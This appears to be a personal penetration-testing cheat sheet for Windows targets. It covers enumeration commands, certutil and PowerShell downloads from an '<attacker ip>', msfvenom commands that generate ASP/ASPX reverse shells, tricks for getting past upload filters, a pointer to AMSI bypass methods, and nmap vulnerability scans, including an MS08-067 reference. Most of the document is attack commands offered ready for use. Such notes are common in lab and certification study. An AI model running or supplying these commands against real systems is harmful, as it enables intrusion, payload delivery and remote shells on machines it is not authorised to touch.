OS architecture 

- powershell

```powershell
# https://docs.microsoft.com/en-us/dotnet/api/system.environment.is64bitoperatingsystem?view=net-6.0
[System.Environment]::Is64BitOperatingSystem
# without .Net
(gwmi Win32_OperatingSystem).OSArchitecture -eq '64-bit'
```

- cmd

```cmd
(wmic os get osarchitecture)
```

AppData's Temp folder (%TEMP%)

```cmd
C:\Users\<User Account>\AppData\Local\Temp
C:\Windows\Temp
```

[displays file ownership information](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir)

```cmd
dir /q /a
```

privileges information

```cmd
whoami /priv
whoami /all
whoami /groups
```

check network connections 

```cmd
netstat -ano | findstr LISTEN
```

file transfer

```cmd
# on target 
certutil -urlcache -split -f "http://<attacker ip>/<file>" "C:\Users\<User Account>\Desktop\<file>"
PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
Powershell Invoke-WebRequest -OutFile C:\Users\<User Account>\Desktop\<file> -Uri http://<attacker ip>/<file>
```

checking if Windows Defender is active

```powershell
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
```

ASP & ASPX reverse shell

```shell
# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f asp -o rev.asp
# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f aspx -o rev.aspx
# file upload bypass
#   try filename "rev.aspx..... .. . . ."
#   try filename "rev.aspx.png"
#   try web.config (File_Upload_Bypass.md)
```

get all drives

```powershell
# powershell
gdr -PSProvider 'FileSystem'
```

```cmd
REM cmd
wmic logicaldisk get deviceid, volumename, description
```

SMB

```shell
nmap -p 445 --script vuln <target ip>
```

Kali provides [Windows executables](https://www.kali.org/tools/windows-binaries/)

```shell
# /usr/share/windows-resources/binaries
find / -name whoami.exe 2>/dev/null
windows-binaries -h
```

UNZIP

```cmd
REM Windows 10 build 17063 or later
tar -xf <zip file>
```

Bypass AMSI Powershell (PEN-300)

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

```
1. one liners to multiple lines
2. hex encoding
```

list firewall rules

```cmd
Netsh advfirewall firewall show rule dir=in name=all
```

Windows Updates

```cmd
wmic qfe
```

```powershell
Get-HotFix
```

Installed Programs

```cmd
wmic product get name, version, installlocation
```

copy file from net share folder

```powershell
Copy-Item -path "\\<target ip or hostname>\<folder($)>" -destination .\ -Recurse
```

check running services

```
Get-Service | where {$_.Status -eq "Running"}
```

[MS08_067](https://github.com/andyacer/ms08_067)

```shell
# check os version
nmap -p <target ports> --script /usr/share/nmap/scripts/smb-os-discovery <target ip>
```